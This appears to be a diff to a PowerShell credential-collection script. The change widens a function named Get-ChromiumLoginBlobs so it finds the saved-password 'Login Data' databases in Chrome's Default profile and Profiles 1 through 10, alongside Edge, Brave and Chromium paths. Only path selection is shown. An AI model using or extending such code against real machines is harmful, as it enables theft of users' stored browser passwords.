@@ -619,7 +619,17 @@ function Get-ChromiumLoginBlobs {
 
     switch ($Browser.ToLower()) {
         "cft"       { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default\Login Data"     }
-        "chrome"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"                        }
+        "chromeDefault"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"                        }
+        "chrome1"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 1\Login Data"                        }
+        "chrome2"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 2\Login Data"                        }
+        "chrome3"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 3\Login Data"                        }
+        "chrome4"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 4\Login Data"                        }
+        "chrome5"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 5\Login Data"                        }
+        "chrome6"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 6\Login Data"                        }
+        "chrome7"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 7\Login Data"                        }
+        "chrome8"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 8\Login Data"                        }
+        "chrome9"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 9\Login Data"                        }
+        "chrome10"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 10\Login Data"                        }
         "edge"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Login Data"                }
         "brave"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Login Data"   }
         "chromium"  { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default\Login Data"                      }
